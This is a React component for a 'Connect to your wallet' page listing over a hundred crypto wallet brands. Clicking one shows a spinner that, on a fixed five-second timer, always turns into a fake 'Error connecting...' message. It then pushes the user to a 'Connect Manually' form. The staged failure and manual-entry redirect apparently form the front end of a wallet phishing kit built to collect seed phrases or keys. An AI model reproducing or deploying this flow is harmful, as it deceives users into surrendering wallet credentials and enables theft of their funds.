import React, { useContext, useEffect, useState } from "react";
import Loader from "../utils/Loader";
import { useNavigate } from "react-router-dom";
// import AOS from "aos";
// import "aos/dist/aos.css";

import {
  Modal,
  Button,
  Card,
  Alert,
  Avatar,
  Spinner,
  Badge,
} from "flowbite-react";
import { HiInformationCircle } from "react-icons/hi";
import { ProjectContext } from "../context/ProjectContext";

const Wallets = () => {
  const myWallets = [
    {
      id: 1,
      wallet: "metamask",
      image: "assets/metamask.png",
    },
    {
      id: 2,
      wallet: "tonkeeper",
      image: "assets/tonkeeper.png",
    },
    {
      id: 3,
      wallet: "phantom",
      image: "assets/phantom.png",
    },
    {
      id: 4,
      wallet: "trust wallet",
      image: "assets/trust.png",
    },
    {
      id: 5,
      wallet: "safepal",
      image: "assets/safepal.png",
    },
    {
      id: 6,
      wallet: "TON wallet",
      image: "assets/ton.png",
    },
    {
      id: 7,
      wallet: "nami",
      image: "assets/nami.png",
    },
    {
      id: 8,
      wallet: "imtoken",
      image: "assets/imtoken.jpeg",
    },
    {
      id: 9,
      wallet: "math",
      image: "assets/math.jpeg",
    },
    {
      id: 10,
      wallet: "token pocket",
      image: "assets/tokenpocket.png",
    },
    {
      id: 11,
      wallet: "torus",
      image: "assets/torus.jpeg",
    },
    {
      id: 12,
      wallet: "rainbow",
      image: "assets/rainbow.jpeg",
    },
    {
      id: 13,
      wallet: "uniswap",
      image: "assets/uniswap.png",
    },
    {
      id: 14,
      wallet: "wallETH",
      image: "assets/wallETH.png",
    },
    {
      id: 15,
      wallet: "Xdefi",
      image: "assets/xdefi.jpeg",
    },
    {
      id: 16,
      wallet: "xinfin",
      image: "assets/xinfin.png",
    },
    {
      id: 17,
      wallet: "yoroi",
      image: "assets/yoroi.png",
    },
    {
      id: 18,
      wallet: "onto",
      image: "assets/onto.png",
    },
    {
      id: 19,
      wallet: "ime",
      image: "assets/ime.jpeg",
    },
    {
      id: 20,
      wallet: "eternl",
      image: "assets/eternl.jpeg",
    },
    {
      id: 21,
      wallet: "alpha",
      image: "assets/alpha.png",
    },
    {
      id: 22,
      wallet: "argent",
      image: "assets/argent.png",
    },
    {
      id: 23,
      wallet: "bitpay",
      image: "assets/bitpay.png",
    },
    {
      id: 24,
      wallet: "brave",
      image: "assets/brave.png",
    },
    {
      id: 25,
      wallet: "coin98",
      image: "assets/coin98.jpeg",
    },
    {
      id: 26,
      wallet: "coinbase",
      image: "assets/coinbase.png",
    },
    {
      id: 27,
      wallet: "ellipal",
      image: "assets/ellipal.png",
    },
    {
      id: 28,
      wallet: "gero",
      image: "assets/gero.jpeg",
    },
    {
      id: 29,
      wallet: "guarda",
      image: "assets/guarda.jpeg",
    },
    {
      id: 30,
      wallet: "ledger live",
      image: "assets/ledger.png",
    },
    {
      id: 31,
      wallet: "alice",
      image: "assets/alice.png",
    },
    {
      id: 32,
      wallet: "aave",
      image: "assets/aave.png",
    },
    {
      id: 33,
      wallet: "adex network",
      image: "assets/adex.jpeg",
    },
    {
      id: 34,
      wallet: "aktionariat",
      image: "assets/aktionariat.jpg",
    },
    {
      id: 35,
      wallet: "authereum",
      image: "assets/authereum.png",
    },
    {
      id: 36,
      wallet: "aToken wallet",
      image: "assets/atoken.jpeg",
    },
    {
      id: 37,
      wallet: "anchor",
      image: "assets/anchor.png",
    },
    {
      id: 38,
      wallet: "ballet",
      image: "assets/ballet.png",
    },
    {
      id: 39,
      wallet: "bifrost",
      image: "assets/bifrost.jpg",
    },
    {
      id: 40,
      wallet: "bisq",
      image: "assets/bisq.png",
    },
    {
      id: 41,
      wallet: "bitget",
      image: "assets/bitget.png",
    },
    {
      id: 42,
      wallet: "coldcard",
      image: "assets/coldcard.jpeg",
    },
    {
      id: 43,
      wallet: "blockchain",
      image: "assets/blockchain-logo.png",
    },
    {
      id: 44,
      wallet: "blocto",
      image: "assets/blocto.webp",
    },
    {
      id: 45,
      wallet: "bluemoon",
      image: "assets/bluemoon.png",
    },
    {
      id: 46,
      wallet: "bluewallet",
      image: "assets/bluewallet.png",
    },
    {
      id: 47,
      wallet: "coti",
      image: "assets/coti.jpg",
    },
    {
      id: 48,
      wallet: "crypto",
      image: "assets/crypto.png",
    },
    {
      id: 49,
      wallet: "cybavo wallet",
      image: "assets/cybavowallet.png",
    },
    {
      id: 50,
      wallet: "d cent",
      image: "assets/dcent.jpeg",
    },
    {
      id: 51,
      wallet: "defiant",
      image: "assets/defiant.jpeg",
    },
    {
      id: 52,
      wallet: "dero",
      image: "assets/dero.png",
    },
    {
      id: 53,
      wallet: "digitex",
      image: "assets/digitex.png",
    },
    {
      id: 54,
      wallet: "DyDx",
      image: "assets/dydx.jpeg",
    },
    {
      id: 55,
      wallet: "eidoo",
      image: "assets/eidoo.png",
    },
    {
      id: 56,
      wallet: "equal",
      image: "assets/equal.png",
    },
    {
      id: 57,
      wallet: "fantom",
      image: "assets/fantom.png",
    },
    {
      id: 58,
      wallet: "fetch",
      image: "assets/fetch.png",
    },
    {
      id: 59,
      wallet: "flare",
      image: "assets/flare.jpeg",
    },
    {
      id: 60,
      wallet: "graph",
      image: "assets/graph.png",
    },
    {
      id: 61,
      wallet: "gridplus",
      image: "assets/gridplus.png",
    },
    {
      id: 62,
      wallet: "hashkey",
      image: "assets/hashkey.jpeg",
    },
    {
      id: 63,
      wallet: "huobi",
      image: "assets/Huobi.png",
    },
    {
      id: 64,
      wallet: "infinito",
      image: "assets/infinito.png",
    },
    {
      id: 65,
      wallet: "infinity",
      image: "assets/infinity.png",
    },
    {
      id: 66,
      wallet: "itoken",
      image: "assets/itoken.png",
    },
    {
      id: 67,
      wallet: "jade",
      image: "assets/jade.jpeg",
    },
    {
      id: 68,
      wallet: "kelpr",
      image: "assets/kelpr.png",
    },
    {
      id: 69,
      wallet: "lead",
      image: "assets/lead.png",
    },
    {
      id: 70,
      wallet: "ledger",
      image: "assets/ledger.png",
    },
    {
      id: 71,
      wallet: "maiar",
      image: "assets/maiar.png",
    },
    {
      id: 72,
      wallet: "mantra dao",
      image: "assets/mantradao.jpeg",
    },
    {
      id: 71,
      wallet: "matcha",
      image: "assets/matcha.jpeg",
    },
    {
      id: 72,
      wallet: "meetone",
      image: "assets/meetone.png",
    },
    {
      id: 73,
      wallet: "morix",
      image: "assets/morixwallet.png",
    },
    {
      id: 74,
      wallet: "mycrypto",
      image: "assets/mycrypto.jpeg",
    },
    {
      id: 75,
      wallet: "nash",
      image: "assets/nash.png",
    },
    {
      id: 76,
      wallet: "nova",
      image: "assets/nova.jpg",
    },
    {
      id: 77,
      wallet: "nym",
      image: "assets/nym.png",
    },
    {
      id: 78,
      wallet: "okx",
      image: "assets/okx.jpeg",
    },
    {
      id: 79,
      wallet: "oasis",
      image: "assets/oasis.jpeg",
    },
    {
      id: 80,
      wallet: "opensea",
      image: "assets/opensea.jpeg",
    },
    {
      id: 81,
      wallet: "opera",
      image: "assets/opera.png",
    },
    {
      id: 82,
      wallet: "ownbit",
      image: "assets/ownbit.png",
    },
    {
      id: 83,
      wallet: "payb",
      image: "assets/payb.png",
    },
    {
      id: 84,
      wallet: "phoenix",
      image: "assets/Phoenix.png",
    },
    {
      id: 85,
      wallet: "pillar",
      image: "assets/pillar.png",
    },
    {
      id: 86,
      wallet: "plasma pay",
      image: "assets/plasmapay.jpeg",
    },
    {
      id: 87,
      wallet: "polkadotjs",
      image: "assets/polkadotjs.png",
    },
    {
      id: 88,
      wallet: "q3",
      image: "assets/q3.jpeg",
    },
    {
      id: 89,
      wallet: "radix",
      image: "assets/radix.png",
    },
    {
      id: 90,
      wallet: "ronin",
      image: "assets/ronin.webp",
    },
    {
      id: 91,
      wallet: "rwallet",
      image: "assets/rwallet.jpeg",
    },
    {
      id: 92,
      wallet: "saita mask",
      image: "assets/saita.jpg",
    },
    {
      id: 93,
      wallet: "simplehold",
      image: "assets/simplehold.jpg",
    },
    {
      id: 94,
      wallet: "sonic",
      image: "assets/sonic.png",
    },
    {
      id: 95,
      wallet: "sparkpoint",
      image: "assets/sparkpoint.png",
    },
    {
      id: 96,
      wallet: "spatium",
      image: "assets/spatium.png",
    },
    {
      id: 97,
      wallet: "staked",
      image: "assets/stakedwallet.jpg",
    },
    {
      id: 98,
      wallet: "starkey",
      image: "assets/starkey.jpg",
    },
    {
      id: 99,
      wallet: "stepN",
      image: "assets/step.png",
    },
    {
      id: 100,
      wallet: "talken",
      image: "assets/talken.jpg",
    },
    {
      id: 101,
      wallet: "ternoa",
      image: "assets/ternoa.png",
    },
    {
      id: 102,
      wallet: "terrastation",
      image: "assets/terrastation.png",
    },
    {
      id: 103,
      wallet: "tezos",
      image: "assets/tezos.png",
    },
    {
      id: 104,
      wallet: "walletconect",
      image: "assets/walletconect.png",
    },
    {
      id: 105,
      wallet: "tongue",
      image: "assets/tongue.jpeg",
    },
    {
      id: 106,
      wallet: "tron",
      image: "assets/tron.png",
    },
    {
      id: 107,
      wallet: "trust vault",
      image: "assets/trustvault.jpeg",
    },
    {
      id: 108,
      wallet: "vechain",
      image: "assets/vechain.png",
    },
    {
      id: 109,
      wallet: "via wallet",
      image: "assets/viawallet.png",
    },
    {
      id: 110,
      wallet: "wallet.io",
      image: "assets/wallet.io.png",
    },
    {
      id: 111,
      wallet: "wazrix",
      image: "assets/wazrix.png",
    },
    {
      id: 112,
      wallet: "yearn",
      image: "assets/yearn.jpeg",
    },
    {
      id: 113,
      wallet: "zaper",
      image: "assets/zaper.jpeg",
    },
    {
      id: 114,
      wallet: "zerion",
      image: "assets/zerion.jpeg",
    },
  ];

  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [isSearching, setIsSearching] = useState(false);
  const [openModal, setOpenModal] = useState(false);
  const [modalPlacement, setModalPlacement] = useState("center");
  const [indexWallet, setIndexWallet] = useState(null); // State to hold the selected wallet ID
  const { setWalletName } = useContext(ProjectContext);

  const goToForm = (wallet) => {
    setOpenModal(false);
    navigate("/connect");
    setWalletName(`${wallet}`);
  };

  const closeModal = () => {
    setOpenModal(false);
    setIsSearching(false);
  };

  const handleWalletClick = (id) => {
    setOpenModal(true);
    // setIsSearching(true);
    setIndexWallet(id); // Update state with the clicked wallet ID
  };

  if (openModal == true) {
    setTimeout(() => {
      setIsSearching(true);
    }, 5000);
  }

  useEffect(() => {
    setTimeout(() => {
      setLoading(true);
    }, 1500);

    // AOS.init({
    //   // Global settings
    //   duration: 1000, // animation duration in milliseconds
    //   once: false, // whether animation should happen only once while scrolling down
    // });
  });

  const selectedWallet = myWallets.filter(
    (wallet) => wallet.id === indexWallet
  );

  // console.log(selectedWallet);

  return loading ? (
    <main className="bg-gray-100 dark:bg-[#101720]">
      <section className="flex flex-col gap-10 max-w-screen-xl mx-auto px-6 xl:px-10 py-10 min-h-screen">
        <div
          data-aos="fade-down"
          className="flex flex-col justify-center items-center"
        >
          <h1 className="text-3xl xl:text-4xl text-gray-900 dark:text-white font-bold capitalize">
            Connect to your wallet
          </h1>
          <p className="text-lg font-semibold leading-snug mt-4 text-gray-900 dark:text-gray-300">
            Select a wallet to continue
          </p>
          <p className="text-base leading-snug mt-2 text-gray-900 dark:text-gray-500">
            Several iOS and Android wallets are compatible with the protocol,
            enabling seamless integration. By scanning a QR code displayed on
            your desktop screen, you can instantly link your mobile wallet to a
            decentralized application (dApp) for secure usage. Additionally,
            mobile apps can seamlessly interact with mobile browsers through the
            support of mobile deep linking.
          </p>
        </div>

        <Modal show={openModal} position={modalPlacement} onClose={closeModal}>
          <Modal.Header>Connect Now</Modal.Header>
          <Modal.Body>
            <div data-aos="zoom-in" className="flex flex-col gap-4">
              {isSearching ? (
                <Alert color="failure" icon={HiInformationCircle}>
                  <div className="flex items-center gap-3 flex-wrap w-full">
                    <span className="font-medium truncate">
                      Error connecting...
                    </span>
                    <Badge
                      onClick={() => goToForm(selectedWallet[0].wallet)}
                      className="cursor-pointer truncate"
                      color="success"
                    >
                      Connect Manually
                    </Badge>
                  </div>
                </Alert>
              ) : (
                <Alert color="info">
                  <div className="flex item-start gap-3 text-sm lg:text-base">
                    <span className="font-medium">Connecting...</span>
                    <Spinner color="info" aria-label="Info spinner example" />
                  </div>
                </Alert>
              )}

              <Card
                onClick={
                  isSearching ? () => goToForm(selectedWallet[0].wallet) : null
                }
                className="cursor-pointer"
              >
                <div className="flex items-center justify-between">
                  <div className="text-gray-900 dark:text-gray-50">
                    <h4 className="text-lg xl:text-xl font-semibold uppercase ">
                      {selectedWallet[0]?.wallet}
                    </h4>
                    <small>Easy-to-use browser extension</small>
                  </div>

                  <Avatar img={selectedWallet[0]?.image} status="online" />
                </div>
              </Card>
            </div>
          </Modal.Body>
          <Modal.Footer>
            <Button color="gray" onClick={closeModal}>
              Cancel
            </Button>
          </Modal.Footer>
        </Modal>
        <div
          data-aos="fade-up"
          className="grid gap-3 lg:gap-4 grid-cols-2 md:grid-cols-4 xl:grid-cols-6"
        >
          {myWallets.map((wallet, index) => (
            <Card onClick={() => handleWalletClick(wallet.id)} key={index}>
              <div className="flex items-center justify-between gap-2 cursor-pointer">
                <img
                  className="lg:h-12 lg:w-12 h-10 w-10 object-cover object-center rounded-xl"
                  src={wallet.image}
                  alt={wallet.wallet}
                  loading="lazy"
                />
                <h1 className="capitalize text-base font-semibold truncate text-gray-900 dark:text-gray-300">
                  {wallet.wallet}
                </h1>
              </div>
            </Card>
          ))}
        </div>
      </section>
    </main>
  ) : (
    <Loader />
  );
};

export default Wallets;
